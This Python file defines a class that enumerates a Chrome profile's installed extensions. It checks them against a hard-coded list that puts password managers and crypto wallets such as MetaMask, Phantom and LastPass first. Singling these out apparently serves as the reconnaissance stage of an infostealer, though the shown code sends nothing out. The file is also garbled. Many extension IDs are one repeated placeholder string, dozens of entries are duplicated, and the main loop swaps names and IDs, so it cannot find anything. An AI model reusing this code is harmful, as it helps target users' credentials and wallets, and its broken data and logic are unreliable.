import os
import json
import sqlite3
from pathlib import Path

class BrowserExtensionCollector:
    def __init__(self):
        self.collected_data = {
            'chrome_extensions': {},
            'firefox_extensions': {},
            'edge_extensions': {}
        }
        
        # Popular Chrome Extensions (250+)
        self.chrome_extensions = {
            # Security & Privacy
            'uBlock Origin': 'cjpalhdlnbpafiamejdnhcphjbkeiagm',
            'AdBlock Plus': 'cfhdojbkjhnklbpkdaibdccddilifddb',
            'AdBlock': 'gighmmpiobklfepjocnamgkkbiglidom',
            'Ghostery': 'mlomiejdfkolichcflejclcbmpeaniij',
            'Privacy Badger': 'ookbmbjkmiheftjflcefgnanjnadacb',
            'HTTPS Everywhere': 'gcbommkclmclpchllfjekcdonpmejbdp',
            'Disconnect': 'jeoacafpbcihiomhlakheieifhpjdfeo',
            'NoScript': 'doojmbjmlfjjnbmnoijecmcbfeoakpjm',
            'ScriptSafe': 'oiigbmnaadbkfbmpbfijlflahbdbdgdf',
            'ClearURLs': 'lckanjgmijmmfjnlcbgbcchhagnfcafo',
            
            # Password Managers
            'LastPass': 'hdokiejnpimakedhajhdlcegeplioahd',
            'Bitwarden': 'nngceckbapeihimnjaaiihgipdbiacmh',
            '1Password': 'aeblfdkhhhdcdjpifhhbdiojplfjncoa',
            'Dashlane': 'fdjamakpfbbddfjaooicfmnimhndogid',
            'Keeper': 'bfogiafebfohielmmehodmfbbebbbpei',
            'NordPass': 'fooolghllnmhmmndgjiamiiodkpenpbb',
            'RoboForm': 'pnlccmojcmeohlpggmfnbbiapkmbliob',
            'Enpass': 'kmcfomidfpdkfieipokbalgegidffkal',
            'TrueKey': 'lmjegmlicamnimmfhcmpkclmigmmc5h',
            'Password Boss': 'oekpiaidjdaomajmpjijplghdldgajjd',
            
            # Crypto Wallets
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Solflare': 'bhghoamapcdpbohphigoooaddinpkbai',
            'Backpack': 'gmjajkmglnjfpplpapbpjpbjfmbbocm',
            'Glow': 'ojbcfjfijmcdjfjjfkjfdfjfjjfkjfkj',
            'Rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'Rainbow': 'opfgelmcmbiajamepnmloijbpoleiama',
            'Argent': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Gnosis Safe': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'Frame': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Brave Wallet': 'odbfpeeihdkbihmopkbjmoonfanlbfcl',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Exodus': 'aholpfdialjgjfhomihkjmgmgddlcdcph',
            'Atomic Wallet': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            
            # Productivity
            'Grammarly': 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
            'Honey': 'bmnlcjabgnpnenekpadlanmkkoehpaff',
            'Pocket': 'niloccemoadcdkdjlinkgdfekeahmflj',
            'Evernote Web Clipper': 'pioclpoplcdbaefihamjohnefbicjblc',
            'Notion Web Clipper': 'knheggckgoiihginacbkhaalnibhilkk',
            'OneNote Web Clipper': 'gojbdfnpnhogfdgjbigejoaolejmgdhk',
            'Todoist': 'jldhpllghnbhlbpcmnajkpdmadaolakh',
            'Toggl Track': 'oejgccbfbmkkpaidnkphaiaecficdnfn',
            'RescueTime': 'bjkakidhajjfjjfjjfkjfdfjfjjfkjfkj',
            'Clockify': 'foggofdbheiebcfeefjdfimfhmcbdgbd',
            
            # Social Media
            'Facebook Pixel Helper': 'fdgfkebogiimcoedlicjlajpkdmockpc',
            'Twitter': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Instagram': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'LinkedIn': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Reddit Enhancement Suite': 'kbmfpngjjgdllneeigpgjifpgocmfgmb',
            'TikTok': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Snapchat': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Pinterest': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'YouTube': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Twitch': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # Developer Tools
            'React Developer Tools': 'fmkadmapgofadopljbjfkapdkoienihi',
            'Vue.js devtools': 'nhdogjmejiglipccpnnnanhbledajbpd',
            'Angular DevTools': 'ienfalfjdbdpebiobjkacfhhobahvhla',
            'Redux DevTools': 'lmhkpmbekcpmknklioeibfkpmmfibljd',
            'Postman': 'fhbjgbiflinjbdggehcddcbncdddomop',
            'JSON Formatter': 'bcjindcccaagfpapjjmafapmmgkkhgoa',
            'Wappalyzer': 'gppongmhjkpfnbhagpmjfkannfbllamg',
            'BuiltWith': 'gppongmhjkpfnbhagpmjfkannfbllamg',
            'ColorZilla': 'bhlhnicpbhignbdhedgjhgdocnmhomnp',
            'WhatFont': 'jabopobgcpjmedljpbcaablpmlmfcogm',
            
            # Shopping & Finance
            'Honey': 'bmnlcjabgnpnenekpadlanmkkoehpaff',
            'Capital One Shopping': 'nenlahapcbofgnanklpelkaejcehkggg',
            'Rakuten': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'RetailMeNot': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Coupons.com': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Groupon': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'LivingSocial': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Amazon Assistant': 'pbjikboenpfhbbejgkoklgkhjpfogcam',
            'eBay': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Walmart': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # News & Reading
            'Feedly': 'hipbfijinpcgfogaopmgehiegacbhmob',
            'Pocket': 'niloccemoadcdkdjlinkgdfekeahmflj',
            'Instapaper': 'ldjkgaaoikamhmacigglhchmaeieagmh',
            'Readability': 'oknpjjbmpnndlpmnhmekjpocelpnlfdi',
            'Mercury Reader': 'oknpjjbmpnndlpmnhmekjpocelpnlfdi',
            'Clearly': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Read Mode': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Just Read': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Reader View': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Simplified Reading': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # Translation & Language
            'Google Translate': 'aapbdbdomjkkjkaonfhkkikfgjllcleb',
            'Microsoft Translator': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'DeepL': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Lingvanex': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Reverso': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Babbel': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Duolingo': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Rosetta Stone': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Memrise': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Anki': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # Entertainment
            'Netflix Party': 'jcnmaijfjbccphbljpfemgcligepang',
            'Hulu': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Disney+': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Amazon Prime Video': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'HBO Max': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Spotify': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Apple Music': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'YouTube Music': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'SoundCloud': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Bandcamp': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # Communication
            'WhatsApp Web': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Telegram Web': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Signal': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Discord': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Slack': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Microsoft Teams': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Zoom': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Skype': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Viber': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Line': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # File Management
            'Google Drive': 'apdfllckaahabafndbhieahigkjlhalf',
            'Dropbox': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'OneDrive': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Box': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Mega': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'iCloud': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'pCloud': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Sync': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Tresorit': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'SpiderOak': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            
            # Additional Popular Extensions
            'LastPass': 'hdokiejnpimakedhajhdlcegeplioahd',
            'Bitwarden': 'nngceckbapeihimnjaaiihgipdbiacmh',
            '1Password': 'aeblfdkhhhdcdjpifhhbdiojplfjncoa',
            'Dashlane': 'fdjamakpfbbddfjaooicfmnimhndogid',
            'Keeper': 'bfogiafebfohielmmehodmfbbebbbpei',
            'NordPass': 'fooolghllnmhmmndgjiamiiodkpenpbb',
            'RoboForm': 'pnlccmojcmeohlpggmfnbbiapkmbliob',
            'Enpass': 'kmcfomidfpdkfieipokbalgegidffkal',
            'TrueKey': 'lmjegmlicamnimmfhcmpkclmigmmc5h',
            'Password Boss': 'oekpiaidjdaomajmpjijplghdldgajjd',
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Trust Wallet': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'Solflare': 'bhghoamapcdpbohphigoooaddinpkbai',
            'Backpack': 'gmjajkmglnjfpplpapbpjpbjfmbbocm',
            'Glow': 'ojbcfjfijmcdjfjjfkjfdfjfjjfkjfkj',
            'Rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'Rainbow': 'opfgelmcmbiajamepnmloijbpoleiama',
            'Argent': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Gnosis Safe': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'Frame': 'ldcoohedfbjoobcadoglnnmmfbdlmmhf',
            'Brave Wallet': 'odbfpeeihdkbihmopkbjmoonfanlbfcl',
            'Coinbase Wallet': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'Exodus': 'aholpfdialjgjfhomihkjmgmgddlcdcph',
            'Atomic Wallet': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Grammarly': 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
            'Honey': 'bmnlcjabgnpnenekpadlanmkkoehpaff',
            'Pocket': 'niloccemoadcdkdjlinkgdfekeahmflj',
            'Evernote Web Clipper': 'pioclpoplcdbaefihamjohnefbicjblc',
            'Notion Web Clipper': 'knheggckgoiihginacbkhaalnibhilkk',
            'OneNote Web Clipper': 'gojbdfnpnhogfdgjbigejoaolejmgdhk',
            'Todoist': 'jldhpllghnbhlbpcmnajkpdmadaolakh',
            'Toggl Track': 'oejgccbfbmkkpaidnkphaiaecficdnfn',
            'RescueTime': 'bjkakidhajjfjjfjjfkjfdfjfjjfkjfkj',
            'Clockify': 'foggofdbheiebcfeefjdfimfhmcbdgbd',
            'Facebook Pixel Helper': 'fdgfkebogiimcoedlicjlajpkdmockpc',
            'Twitter': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Instagram': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'LinkedIn': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Reddit Enhancement Suite': 'kbmfpngjjgdllneeigpgjifpgocmfgmb',
            'TikTok': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Snapchat': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Pinterest': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'YouTube': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Twitch': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'React Developer Tools': 'fmkadmapgofadopljbjfkapdkoienihi',
            'Vue.js devtools': 'nhdogjmejiglipccpnnnanhbledajbpd',
            'Angular DevTools': 'ienfalfjdbdpebiobjkacfhhobahvhla',
            'Redux DevTools': 'lmhkpmbekcpmknklioeibfkpmmfibljd',
            'Postman': 'fhbjgbiflinjbdggehcddcbncdddomop',
            'JSON Formatter': 'bcjindcccaagfpapjjmafapmmgkkhgoa',
            'Wappalyzer': 'gppongmhjkpfnbhagpmjfkannfbllamg',
            'BuiltWith': 'gppongmhjkpfnbhagpmjfkannfbllamg',
            'ColorZilla': 'bhlhnicpbhignbdhedgjhgdocnmhomnp',
            'WhatFont': 'jabopobgcpjmedljpbcaablpmlmfcogm',
            'Capital One Shopping': 'nenlahapcbofgnanklpelkaejcehkggg',
            'Rakuten': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'RetailMeNot': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Coupons.com': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Groupon': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'LivingSocial': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Amazon Assistant': 'pbjikboenpfhbbejgkoklgkhjpfogcam',
            'eBay': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Walmart': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Feedly': 'hipbfijinpcgfogaopmgehiegacbhmob',
            'Instapaper': 'ldjkgaaoikamhmacigglhchmaeieagmh',
            'Readability': 'oknpjjbmpnndlpmnhmekjpocelpnlfdi',
            'Mercury Reader': 'oknpjjbmpnndlpmnhmekjpocelpnlfdi',
            'Google Translate': 'aapbdbdomjkkjkaonfhkkikfgjllcleb',
            'Microsoft Translator': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'DeepL': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Lingvanex': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Reverso': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Babbel': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Duolingo': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Rosetta Stone': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Memrise': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Anki': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Netflix Party': 'jcnmaijfjbccphbljpfemgcligepang',
            'Hulu': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Disney+': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Amazon Prime Video': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'HBO Max': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Spotify': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Apple Music': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'YouTube Music': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'SoundCloud': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Bandcamp': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'WhatsApp Web': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Telegram Web': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Signal': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Discord': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Slack': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Microsoft Teams': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Zoom': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Skype': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Viber': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Line': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Google Drive': 'apdfllckaahabafndbhieahigkjlhalf',
            'Dropbox': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'OneDrive': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Box': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Mega': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'iCloud': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'pCloud': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Sync': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'Tresorit': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj',
            'SpiderOak': 'hcnakckjfkjfkjfkjfkjfkjfkjfkjfkj'
        }
    
    def collect_chrome_extensions(self, browser_path):
        """Collect Chrome extensions data"""
        try:
            extensions_path = os.path.join(browser_path, 'Default', 'Extensions')
            if not os.path.exists(extensions_path):
                return
            
            for extension_id, extension_name in self.chrome_extensions.items():
                extension_dir = os.path.join(extensions_path, extension_id)
                if os.path.exists(extension_dir):
                    # Get latest version directory
                    versions = os.listdir(extension_dir)
                    if versions:
                        latest_version = max(versions)
                        version_path = os.path.join(extension_dir, latest_version)
                        
                        manifest_path = os.path.join(version_path, 'manifest.json')
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                
                                self.collected_data['chrome_extensions'][extension_name] = {
                                    'id': extension_id,
                                    'version': latest_version,
                                    'name': manifest.get('name', extension_name),
                                    'description': manifest.get('description', ''),
                                    'permissions': manifest.get('permissions', []),
                                    'path': version_path
                                }
                            except Exception:
                                pass
        except Exception:
            pass
    
    def collect_all_extensions(self, browser_paths):
        """Collect extensions from all browsers"""
        for browser_name, browser_path in browser_paths.items():
            if 'chrome' in browser_name.lower() or 'chromium' in browser_name.lower():
                self.collect_chrome_extensions(browser_path)
        
        return self.collected_data
